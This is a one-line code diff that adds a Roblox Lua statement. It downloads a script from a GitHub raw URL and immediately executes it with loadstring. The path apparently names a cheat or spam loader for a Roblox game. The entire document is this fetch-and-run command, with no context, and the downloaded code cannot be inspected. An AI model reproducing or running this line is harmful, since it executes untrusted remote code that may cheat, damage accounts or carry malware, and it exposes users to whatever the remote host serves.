@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/path-2-mobile-dragon-generations-spam6-ncemmfdyijby62.lua"))()
